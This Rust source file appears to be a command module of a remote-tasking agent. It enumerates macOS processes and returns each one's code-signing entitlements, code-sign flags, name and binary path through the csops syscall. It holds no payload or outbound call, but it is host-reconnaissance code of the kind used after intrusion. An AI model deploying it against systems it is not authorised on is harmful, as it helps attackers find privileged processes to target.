use crate::structs::Task;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::collections::HashMap;

#[derive(Deserialize)]
struct ListEntitlementsArgs {
    #[serde(default = "default_pid")]
    pid: i32,
}

fn default_pid() -> i32 {
    -1
}

#[derive(Serialize)]
struct ProcessEntitlements {
    process_id: i32,
    entitlements: HashMap<String, Value>,
    name: String,
    bin_path: String,
    code_sign: i32,
}

// csops syscall number on macOS (not in libc crate)
const CS_OPS_ENTITLEMENTS_BLOB: u32 = 7;
const CS_OPS_STATUS: u32 = 0;
const SYS_CSOPS: i32 = 169; // macOS syscall number for csops

unsafe fn csops(pid: i32, ops: u32, useraddr: *mut u8, usersize: usize) -> i32 {
    libc::syscall(SYS_CSOPS, pid, ops, useraddr, usersize) as i32
}

fn get_entitlements(pid: i32) -> Result<String, String> {
    // First call to get the size
    let mut buf = vec![0u8; 1024 * 1024]; // 1MB buffer
    let ret = unsafe { csops(pid, CS_OPS_ENTITLEMENTS_BLOB, buf.as_mut_ptr(), buf.len()) };
    if ret != 0 {
        return Err(format!("csops failed for pid {}", pid));
    }

    // The blob starts with a magic + length header (8 bytes)
    if buf.len() < 8 {
        return Err("Buffer too small".to_string());
    }

    let length = u32::from_be_bytes([buf[4], buf[5], buf[6], buf[7]]) as usize;
    if length <= 8 || length > buf.len() {
        return Ok(String::new());
    }

    let xml_data = &buf[8..length];
    Ok(String::from_utf8_lossy(xml_data).to_string())
}

fn get_codesign_status(pid: i32) -> i32 {
    let mut flags: u32 = 0;
    let ret = unsafe {
        csops(
            pid,
            CS_OPS_STATUS,
            &mut flags as *mut u32 as *mut u8,
            std::mem::size_of::<u32>(),
        )
    };
    if ret != 0 {
        return -1;
    }
    flags as i32
}

fn get_process_name(pid: i32) -> String {
    let mut buf = [0u8; libc::MAXCOMLEN + 1];
    let ret = unsafe { libc::proc_name(pid, buf.as_mut_ptr() as *mut _, buf.len() as u32) };
    if ret > 0 {
        String::from_utf8_lossy(&buf[..ret as usize]).to_string()
    } else {
        String::new()
    }
}

fn get_process_path(pid: i32) -> String {
    let mut buf = [0u8; libc::PROC_PIDPATHINFO_MAXSIZE as usize];
    let ret =
        unsafe { libc::proc_pidpath(pid, buf.as_mut_ptr() as *mut _, buf.len() as u32) };
    if ret > 0 {
        String::from_utf8_lossy(&buf[..ret as usize]).to_string()
    } else {
        String::new()
    }
}

const PROC_ALL_PIDS: u32 = 1;

fn get_all_pids() -> Vec<i32> {
    let count = unsafe { libc::proc_listpids(PROC_ALL_PIDS, 0, std::ptr::null_mut(), 0) };
    if count <= 0 {
        return vec![];
    }
    let mut pids = vec![0i32; count as usize];
    let ret = unsafe {
        libc::proc_listpids(
            PROC_ALL_PIDS,
            0,
            pids.as_mut_ptr() as *mut _,
            (pids.len() * std::mem::size_of::<i32>()) as i32,
        )
    };
    if ret <= 0 {
        return vec![];
    }
    let num_pids = ret as usize / std::mem::size_of::<i32>();
    pids.truncate(num_pids);
    pids.retain(|&p| p > 0);
    pids
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let args: ListEntitlementsArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(e) => {
            response.set_error(&format!("Failed to parse: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    if args.pid < 0 {
        // List entitlements for all processes
        let pids = get_all_pids();
        let mut results: Vec<ProcessEntitlements> = Vec::new();

        for pid in pids {
            let name = get_process_name(pid);
            let bin_path = get_process_path(pid);
            let entitlements = match get_entitlements(pid) {
                Ok(xml) => {
                    if xml.is_empty() {
                        HashMap::new()
                    } else {
                        // Try to parse as plist
                        match plist::from_bytes::<HashMap<String, Value>>(xml.as_bytes()) {
                            Ok(ent) => ent,
                            Err(_) => {
                                let mut m = HashMap::new();
                                m.insert("raw".to_string(), Value::String(xml));
                                m
                            }
                        }
                    }
                }
                Err(e) => {
                    let mut m = HashMap::new();
                    m.insert("error".to_string(), Value::String(e));
                    m
                }
            };
            let code_sign = get_codesign_status(pid);

            results.push(ProcessEntitlements {
                process_id: pid,
                entitlements,
                name,
                bin_path,
                code_sign,
            });
        }

        response.user_output = serde_json::to_string(&results).unwrap_or_default();
    } else {
        match get_entitlements(args.pid) {
            Ok(xml) => {
                response.user_output = xml;
            }
            Err(e) => {
                response.status = "error".to_string();
                response.user_output = e;
            }
        }
    }

    response.completed = true;
    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
